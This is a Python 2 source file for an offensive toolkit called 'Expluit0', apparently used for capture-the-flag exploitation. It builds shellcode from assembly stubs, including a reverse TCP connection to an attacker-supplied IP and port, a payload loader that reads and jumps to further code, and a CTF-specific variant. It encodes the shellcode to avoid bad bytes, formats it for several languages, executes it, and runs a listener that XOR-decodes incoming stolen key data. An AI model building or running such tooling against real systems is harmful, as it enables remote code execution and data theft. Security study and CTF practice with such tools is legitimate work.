#!/usr/bin/python
# -*- encoding:utf-8 -*-
# Written by Posquit0
# It is forked from lifeasageek's scodeGenerator in PLUS

# To Do List:
# 1. IPv4[o] and IPv6
# 2. Add Format: python[o], cpp[o], perl, java, ruby, c, php
# 3. Add Shellcode: local
# 4. Add OS: linux, freebsd, bsd, arm, Solaris
# 5. Encoding Technic: C -> Python Porting
# 6. Scode Classfication

from re import findall
import os
import tempfile
from SocketServer import TCPServer, BaseRequestHandler
# SocketServer.TCPServer.allow_reuse_address = True

# Temp Direcotry
TEMP_DIRECTORY = "temp"

# OS for Shellcode : "freebsd" or "linux" ...
PLATFORM_OS_LINUX = "linux"
PLATFORM_OS_FREEBSD = "freebsd"
#PLATFORM_OS_WIN = "win"
#PLATFORM_OS_OPENBSD = "openbsd"
#PLATFORM_OS_SOLARIS = "solaris"

DEFAULT_PLATFORM_OS = "linux"

# Arch for Shellcode : "x86" or "x64"
PLATFORM_ARCH_X86 = "x86"
PLATFORM_ARCH_X64 = "x64"
#PLATFORM_ARCH_ARM = "arm"
#PLATFORM_ARCH_I386 = "i386"
#PLATFORM_ARCH_IA64 = "ia64"
#PLATFORM_ARCH_ARM64 = "arm64"
#PLATFORM_ARCH_MIPS = "mips"
#PLATFORM_ARCH_SPARC = "sparc"
#PLATFORM_ARCH_POWERPC = "powerpc"

DEFAULT_PLATFORM_ARCH = PLATFORM_ARCH_X86

# Output Format : "python" or "cpp" ...
FORMAT_PYTHON = "python"
FORMAT_PERL = "perl"
FORMAT_RUBY = "ruby"
FORMAT_CPP = "cpp"

DEFAULT_FORMAT = FORMAT_PYTHON

class ShellCode(str):
    def __new__(cls, *args, **kwargs):
        return str.__new__(cls, *args, **kwargs)

    def get(self):
        return self

    def getFormat(self, outFormat=DEFAULT_FORMAT):
        if outFormat == FORMAT_PYTHON:
            sCodeStr = """sCode = ""\n"""
            for idx, ch in enumerate(self):
                if idx % 8 == 0:
                    sCodeStr += "sCode += \""
                sCodeStr += "\\x%02x" % ord(ch)
                if idx % 8 == 7:
                    sCodeStr += "\"\n"

            if len(self) % 8 != 0:
                sCodeStr += "\""

            return sCodeStr

        elif outFormat == FORMAT_CPP:
            sCodeStr = """char SCODE[] = ""\n"""
            for idx, ch in enumerate(self):
                if idx % 8 == 0:
                    sCodeStr += "\""
                sCodeStr += "\\x%02x" % ord(ch)
                if idx % 8 == 7:
                    sCodeStr += "\"\n"

            if len(self) % 8 != 0:
                sCodeStr += "\""

            sCodeStr += ";"

            return sCodeStr

        elif outFormat == FORMAT_PERL:
            sCodeStr = """my $sCode =\n"""
            for idx, ch in enumerate(self):
                if idx % 8 == 0:
                    sCodeStr += "\""
                sCodeStr += "\\x%02x" % ord(ch)
                if idx % 8 == 7:
                    sCodeStr += "\" .\n"

            if len(self) % 8 != 0:
                sCodeStr += "\""

            sCodeStr += ";"

            return sCodeStr

        elif outFormat == FORMAT_RUBY:
            sCodeStr = """sCode =\n"""
            for idx, ch in enumerate(self):
                if idx % 8 == 0:
                    sCodeStr += "\""
                sCodeStr += "\\x%02x" % ord(ch)
                if idx % 8 == 7:
                    sCodeStr += "\" +\n"

            if len(self) % 8 != 0:
                sCodeStr += "\""

            return sCodeStr

    def run(self):
        curPath = os.path.split(os.path.abspath(__file__))[0]
        scodeRunner = os.path.join(curPath, "utils", "scode_runner")
        tempDir = os.path.join(curPath, TEMP_DIRECTORY)
        tempfile.tempdir = tempDir

        if not os.path.exists(tempDir):
            os.mkdir(tempDir)

        tempFile = tempfile.mktemp()

        binFile = tempFile + ".bin"
        print "[*] Temp File: <%s>" % tempFile

        open(binFile, "wb").write(self + "\x00")

        print "[*] Run Shellcode: %s" % (os.path.basename(binFile))
        print "$ %s %s" % (os.path.basename(scodeRunner), os.path.basename(binFile))
        runScode = "%s %s" % (scodeRunner, binFile)

        # Run Shellcode
        os.system(runScode)

        return

    def encode(self, *restricted):
        curPath = os.path.split(os.path.abspath(__file__))[0]
        scodeEncoder = os.path.join(curPath, "utils", "scode_encoder")
        tempDir = os.path.join(curPath, TEMP_DIRECTORY)
        tempfile.tempdir = tempDir

        if not os.path.exists(tempDir):
            os.mkdir(tempDir)

        tempFile = tempfile.mktemp()

        binFile = tempFile + ".bin"
        encFile = tempFile + ".enc.bin"
        print "[*] Temp File: <%s>" % tempFile

        open(binFile, "wb").write(self + "\x00")

        print "[*] Encode Shellcode"
        defaultBytes = ['0x00', '0x0d', '0x0a', '0x2f']
        restrictedBytes = defaultBytes + list(restricted)
        print "[*] with restricted bytes:", " ".join(b for b in restrictedBytes)

        restrictedParam = ",".join(b for b in restrictedBytes)
        cmdStr = "%s %s %s > %s" % (scodeEncoder, binFile, restrictedParam, encFile)
        os.system(cmdStr)

        enc_sCode = open(encFile, "rb").read()
        print "[*] wrote [0x%x] [%d] bytes encoded shellcode\n" % (len(enc_sCode), len(enc_sCode))

        return ShellCode(enc_sCode)


class InvalidPlatformError(Exception):
    pass

class ScodeGen(object):
    def __init__(self, platform=(DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile="sample.s"):
        self.platform_os, self.platform_arch = platform
        self.stubFile = stubFile

        self.curPath = os.path.split(os.path.abspath(__file__))[0]
#        self.curPath = self.curPath.replace("\\", "/")

        if self.platform_os == PLATFORM_OS_FREEBSD:
            self.stubDir = os.path.join("stub", "freebsd")
        elif self.platform_os == PLATFORM_OS_LINUX:
            self.stubDir = os.path.join("stub", "linux")
        else:
            print "[!] Error: Platform <%s %s> is not available" % (self.platform_os, self.platform_arch)
            raise InvalidPlatformError

        if self.platform_arch == PLATFORM_ARCH_X86:
            self.stubDir = os.path.join(self.stubDir, "x86")
        elif self.platform_arch == PLATFORM_ARCH_X64:
            self.stubDir = os.path.join(self.stubDir, "x64")
        else:
            print "[!] Error: Platform <%s %s> is not available" % (self.platform_os, self.platform_arch)
            raise InvalidPlatformError

        self.stubDir = os.path.join(self.curPath, self.stubDir)

        self.tempDir = os.path.join(self.curPath, TEMP_DIRECTORY)
        tempfile.tempdir = self.tempDir

        if not os.path.exists(self.tempDir):
            os.mkdir(self.tempDir)

        self.tempFile = tempfile.mktemp()
#        self.tempFile = self.tempFile.replace("\\", "/")

        self.asmFile = self.tempFile + ".s"
        self.objFile = self.tempFile + ".o"
        self.dumpFile = self.tempFile + ".dump"
        self.binFile = self.tempFile + ".bin"
        self.encFile = self.tempFile + ".enc.bin"
        print "[*] Temp File: <%s>" % self.tempFile

        self.scodeRunner = os.path.join(self.curPath, "utils", "scode_runner")
        self.scodeEncoder = os.path.join(self.curPath, "utils", "scode_encoder")

        self._prepareStub()
        self.sCode = self.__loadScode()

        return

    def _prepareStub(self):
        print "[*] _prepareStub()"

        # Prepare Stub
        stub = open(os.path.join(self.stubDir, self.stubFile)).read()

        open(self.asmFile, "w").write(stub)

        # Compile Stub
        os.system("as %s -o %s" % (self.asmFile, self.objFile))
        os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))

        return

    def __loadScode(self):
        print "[*] __loadScode()"
        dump = open(self.dumpFile).read()

        opCodeList = findall(":\t(.*)\t", dump)
        sCode = "".join(
            opCode.decode("hex")
            for opCodes in opCodeList
                for opCode in opCodes.strip().split()
        )

        open(self.binFile, "wb").write(sCode + "\x00")
        print "[*] wrote [0x%x] [%d] bytes shellcode\n" % (len(sCode), len(sCode))

        return ShellCode(sCode)

    def run(self):
        print "[*] Run Shellcode: %s" % (os.path.basename(self.binFile))
        print "$ %s %s" % (os.path.basename(self.scodeRunner), os.path.basename(self.binFile))
        runScode = "%s %s" % (self.scodeRunner, self.binFile)

        # Run Shellcode
        os.system(runScode)

        return

    def get(self):
        return self.sCode

    def getFormat(self, outFormat=FORMAT_PYTHON):
        return self.sCode.getFormat(outFormat)

    def encode(self, *restricted):
        print "[*] Encode Shellcode"
        defaultBytes = ['0x00', '0x0d', '0x0a', '0x2f']
        restrictedBytes = defaultBytes + list(restricted)
        print "[*] with restricted bytes:", " ".join(b for b in restrictedBytes)

        restrictedParam = ",".join(b for b in restrictedBytes)
        cmdStr = "%s %s %s > %s" % (self.scodeEncoder, self.binFile, restrictedParam, self.encFile)
        os.system(cmdStr)

        enc_sCode = open(self.encFile, "rb").read()
        print "[*] wrote [0x%x] [%d] bytes encoded shellcode\n" % (len(enc_sCode), len(enc_sCode))

        return ShellCode(enc_sCode)

class PayloadLoaderScodeGen(ScodeGen):
    def __init__(self, fdNum=0x04, payloadSize=0x400, platform=(DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile="read_jump.s"):
        self.fdNum = fdNum
        self.payloadSize = payloadSize

        super(PayloadLoaderScodeGen, self).__init__(platform, stubFile)

        return

    def _prepareStub(self):
        print "[*] _prepareStub()"

        # Prepare Stub
        stub = open(os.path.join(self.stubDir, self.stubFile)).read()

        stub = stub.replace("{{FD_NUM}}", "0x%02x" % (self.fdNum + 1))
        stub = stub.replace("{{PAYLOAD_SIZE}}", "0x%02x" % (self.payloadSize / 0x100))

        open(self.asmFile, "w").write(stub)

        # Compile Stub
        os.system("as %s -o %s" % (self.asmFile, self.objFile))
        os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))

        return

class ReverseConnectionScodeGen(ScodeGen):
    def __init__(self, ipAddr, portNum, platform=(DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile="reverse_tcp.s"):
        self.ipAddr = ipAddr
        self.portNum = portNum

        super(ReverseConnectionScodeGen, self).__init__(platform, stubFile)

        return

    def _prepareStub(self):
        print "[*] _prepareStub()"

        # Prepare Stub
        stub = open(os.path.join(self.stubDir, self.stubFile)).read()

        inetAddr = toInetAddr(self.ipAddr)
        portNum = toInetPort(self.portNum)

        stub = stub.replace("{{IP_ADDR}}", "0x%s" % inetAddr)
        stub = stub.replace("{{PORT}}", portNum)

        open(self.asmFile, "w").write(stub)

        # Compile Stub
        os.system("as %s -o %s" % (self.asmFile, self.objFile))
        os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))

        return


class ReadScodeGen(ScodeGen):
    def __init__(self, keyFile, keySize, ipAddr, portNum, xorValue=0x77, platform=(DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile="sample.s"):
        self.keyFile = keyFile
        self.keySize = keySize
        self.ipAddr = ipAddr
        self.portNum = portNum
        self.xorValue = xorValue

        super(ReadScodeGen, self).__init__(platform, stubFile)

        return

    def _prepareStub(self):
        print "[*] _prepareStub()"

        # Prepare Stub
        stub = open("%s/%s" % (self.stubDir, self.stubFile)).read()

        open(self.asmFile, "w").write(stub)

        # Compile Stub
        os.system("as %s -o %s" % (self.asmFile, self.objFile))
        os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
        return

class SecuInsideScodeGen(ReverseConnectionScodeGen):
    def __init__(self, ipAddr, portNum, platform=(DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile="secuinside.s"):
        super(SecuInsideScodeGen, self).__init__(ipAddr, portNum, platform, stubFile)

        return

    def _prepareStub(self):
        print "[*] _prepareStub()"

        # Prepare Stub
        stub = open(os.path.join(self.stubDir, self.stubFile)).read()

        inetAddr = toInetAddr(self.ipAddr)
        portNum = toInetPort(self.portNum)

        stub = stub.replace("{{IP_ADDR}}", "0x%s" % inetAddr)
        stub = stub.replace("{{PORT}}", portNum)

        open(self.asmFile, "w").write(stub)

        # Compile Stub
        os.system("as %s -o %s" % (self.asmFile, self.objFile))
        os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))

        return


class KeyServer(TCPServer):
    allow_reuse_address = True


class KeyHandler(BaseRequestHandler):
    xorValue = 0x77
    isDaemon = False

    def handle(self):
        while self.isDaemon:
            # self.request is the TCP socket connected to the client
            conn = self.request
            encData = conn.recv(1024).strip()

            if encData == "":
                conn.close()
                return

            decData = "".join(
                chr(ord(ch) ^ self.xorValue) for ch in encData
            )

            ipAddr = self.client_address[0]
            portNum = self.client_address[1]

            logStr = "[From %s : %s] XOR %02x\n" % (ipAddr, portNum, self.xorValue)
            logStr += "[ENC] %s\n" % encData
            logStr += "[DEC] %s\n" % decData
            print logStr

            # auth() need to be override :D
            self.auth()

        return

    def auth(self):
        return


def toInetAddr(ipAddr):
    inetTable = [
        "%02x" % int(x) for x in ipAddr.split(".")
    ]

    inetTable.reverse()
    inetAddr = "".join(inetTable)

    return inetAddr

def fromInetAddr(inetAddr):
    inetAddrNum = int(inetAddr, 16)
    inetTable = []

    while inetAddrNum:
        inetTable.append(str(inetAddrNum % 256))
        inetAddrNum /= 256

    ipAddr = ".".join(
        inetTable
    )

    return ipAddr

def toInetPort(portNum):
    inetPort = 0
    inetPort += (portNum & 0xFF) << 8
    inetPort += (portNum & 0xFF00) >> 8
    inetPort = "%04x" % inetPort

    return inetPort

def fromInetPort(inetPort):
    inetPortNum = int(inetPort, 16)

    portNum = 0
    portNum += (inetPortNum & 0xFF) << 8
    portNum += (inetPortNum & 0xFF00) >> 8

    return portNum

if __name__ == '__main__':
    import optparse
    from sys import argv

    # For the future.
    # Banner
    print "Expluit0"
    print "by Posquit0 <posquit0.bj@gmail.com>"


    # Configure the command line parser

    # Parse the command line arguments
